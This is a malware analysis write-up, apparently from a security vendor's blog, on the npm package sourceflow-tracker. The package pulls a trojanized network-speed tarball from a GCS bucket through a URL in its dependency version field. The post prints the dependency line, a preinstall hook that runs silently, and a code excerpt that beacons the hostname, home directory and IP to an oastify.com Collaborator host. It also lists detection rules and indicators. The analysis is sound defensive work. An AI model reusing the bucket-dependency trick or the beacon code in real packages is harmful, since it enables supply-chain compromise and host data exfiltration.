---
title: "sourceflow-tracker: I Has a Bucket — npm fetches its payload from GCS"
date: 2026-06-02
summary: "A 379-byte package whose only load-bearing content is a dependency version string pointing into a Google Cloud Storage bucket — so npm itself downloads and detonates the payload, and the registry never holds a copy to scan."
packageName: sourceflow-tracker
ecosystem: npm
---

<img src="/assets/images/sourceflow-tracker-walrus-bucket.jpg" alt="Meme: a walrus guarding a bucket — 'I has a bucket.' Here npm fetches the payload from the attacker's bucket for them.">

Most malicious npm packages hide the payload in the tarball you install; `sourceflow-tracker` couldn't be bothered. Its only load-bearing content is a dependency whose version string is a URL into a Google Cloud Storage bucket, so npm does the fetching and npm does the detonating, and the registry never holds a copy to scan. What it retrieves is a verbatim copy of the public `network-speed` module with a beacon stapled on, phoning the host's internal IP, hostname, and home directory to a Burp Collaborator subdomain — dependency-confusion research from the [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) cluster, only this time the walrus sends npm to fetch its bucket.

## Package metadata

| Field | Value |
| --- | --- |
| Name | `sourceflow-tracker` |
| Version | `99.91.9` |
| Author | `lslsls` |
| Description | `lspodcc` |
| License | `UNLICENSED` |
| Dependency | `ltidisafe`: `https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz` |

## Stage 1 — sourceflow-tracker: the bucket dependency

The published package is an empty suit: a one-line `index.js`, npm's stock test script, and one dependency entry whose version — normally a semver range — is a raw URL into a public GCS bucket. npm resolves remote-tarball URLs without complaint, so `storage.googleapis.com` ships stage two: a domain every corporate proxy already waves through, hosting a tarball the operator can swap without touching npm again. cleave carries a rule named for exactly this, a GCS bucket masquerading as a dependency version.

<pre class="lang-js"><code><span class="tok-com">// sourceflow-tracker package.json — the entire malicious surface</span>
<span class="tok-str">"dependencies"</span>: {
  <span class="tok-str">"ltidisafe"</span>: <span class="tok-str">"https://storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz"</span>
}
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/metadata-anomaly/dependency/direct-url::dep-bucket-gcs` | Dependency value is a GCS bucket URL: `storage.googleapis.com/lscunpentest/pack_ux_foundry.tgz` |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/metadata-anomaly/dependency/direct-url::url-dep-minimal-metadata` | URL dependency paired with skeletal metadata (`lspodcc`) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/versioning::npm-version-major-40-plus` | Version `99.91.9` — a dependency-confusion squat signal |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/metadata-anomaly/package/npm::npm-init-default-test` | Stock `npm init` placeholder test script |

## Stage 2 — pack_ux_foundry: the preinstall beacon

The tarball is a faithful copy of the public `network-speed` module with the malware bolted on as a separate `test.js`, fired from a `preinstall` hook with its output routed to oblivion. It grabs the host's internal IPv4 (in the clear), hostname, and home directory (both hex-encoded to survive as a DNS label), then exfils each one not through its own HTTP client but by pointing the borrowed library's `checkDownloadSpeed` at the Collaborator URL — the "speed test" is the exfil. Each value leaves as the leftmost label of `<value>.ux-foundry.<collab>.oastify.com`, which leaks at DNS resolution whether or not the GET ever lands.

<pre class="lang-js"><code><span class="tok-com">// pack_ux_foundry test.js — runs from preinstall, beacons three facts</span>
<span class="tok-kw">const</span> hn = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">hostname</span>());   <span class="tok-com">// hostname, hex'd for a DNS label</span>
<span class="tok-kw">const</span> hd = <span class="tok-fn">stringToHex</span>(os.<span class="tok-fn">homedir</span>());   <span class="tok-com">// home dir, hex'd</span>
<span class="tok-kw">var</span> localip = <span class="tok-fn">getIp</span>(<span class="tok-str">'IPv4'</span>);            <span class="tok-com">// internal IPv4, in clear</span>
<span class="tok-fn">getNetworkDownloadSpeedData</span>(localip);    <span class="tok-com">// → GET http://&lt;data&gt;.ux-foundry.&lt;collab&gt;.oastify.com</span>
<span class="tok-fn">getNetworkDownloadSpeedData</span>(hn);
<span class="tok-fn">getNetworkDownloadSpeedData</span>(hd);
</code></pre>

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/install-hook/scripts/lifecycle::silent-obfuscated-npm-dropper` | `preinstall` runs `node test.js > /dev/null 2>&1` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/exfiltration/dns/tunnel::subdomain-encode` | Victim data encoded as the leftmost subdomain label of `wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/recon-exfil/dns::dns-lookup-with-canary-domain` | Host recon resolved through an `oast` canary domain |
| <span class="sev-dot notable" title="notable"></span> | `objectives/exfiltration/oob/endpoint::oastify` | Callback host is a Burp Collaborator subdomain on `oastify.com` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/recon-exfil/package::npm-victim-id-recon` | Collects host identity via `os.networkInterfaces` and `os.homedir` |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/trojanized/library/framework::preinstall-hook` | A `preinstall` hook grafted onto a copied library |

## Same recipe as shop-minis

Strip the costume and this is the [shop-minis](/discoveries/2026/05/shop-minis-burp-canary/) probe again: dependency-confusion recon beaconed to a Burp Collaborator subdomain, then it politely stops with no stealer or persistence, the only change being that the bucket — not an install hook — carries the bag. The mercy is that this bucket holds a recon ping; the same trick with worse cargo would look identical until somebody re-read the tarball.

## Indicators

| Type | Value |
| --- | --- |
| Stage-0 tarball SHA-256 | [`4e87b803b8e6a18cfef9bb81e186d927081290f7870ab3ce6cf9b4c2eaf81e3e`](https://lab.atomdrift.org/file/4e87b803b8e6a18cfef9bb81e186d927081290f7870ab3ce6cf9b4c2eaf81e3e) |
| Stage-0 index.js SHA-256 | [`e89c7bb78ab236d8872813fcf9dea56166bcf717f07b264d819223f06c3d9afd`](https://lab.atomdrift.org/file/e89c7bb78ab236d8872813fcf9dea56166bcf717f07b264d819223f06c3d9afd) |
| Stage-2 package | `s.ls.ls.ls@1.0.5` |
| Stage-2 tarball SHA-256 | [`1cc73e93d4577fca7478854b4ada86bc78ed8b83369928fd97b4225809d76b52`](https://lab.atomdrift.org/file/1cc73e93d4577fca7478854b4ada86bc78ed8b83369928fd97b4225809d76b52) |
| Stage-2 index.js SHA-256 | [`e9105cfb50a1d8d3d8cabbc1a8dfd0a04966d00bbdd8707d65001e930f842bf5`](https://lab.atomdrift.org/file/e9105cfb50a1d8d3d8cabbc1a8dfd0a04966d00bbdd8707d65001e930f842bf5) |
| Stage-2 test.js SHA-256 | [`6470d87928dbb2ee3950ec33cbc30d1809bf395fadb98cf0d91d6f6e8115d4b0`](https://lab.atomdrift.org/file/6470d87928dbb2ee3950ec33cbc30d1809bf395fadb98cf0d91d6f6e8115d4b0) |
| OOB callback | `http://<data>.ux-foundry.wwwz15e554m201wwajfl7m1ey54z1nq.oastify.com` |
</content>
</invoke>
